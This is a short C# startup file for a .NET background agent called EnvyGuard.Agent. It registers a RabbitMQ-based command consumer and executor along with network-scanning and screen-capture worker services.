using EnvyGuard.Agent;
using EnvyGuard.Agent.Messaging;
using EnvyGuard.Agent.Services;
using DotNetEnv;

Env.Load();

var builder = Host.CreateApplicationBuilder(args);

builder.Services.AddSingleton<RabbitMqConnection>();
builder.Services.AddSingleton<CommandExecutor>();
builder.Services.AddSingleton<CommandConsumer>();

builder.Services.AddHostedService<Worker>();
builder.Services.AddHostedService<EnvyGuard.Agent.Services.NetworkScannerWorker>();
builder.Services.AddHostedService<ScreenSpyWorker>(); 
var host = builder.Build();
host.Run();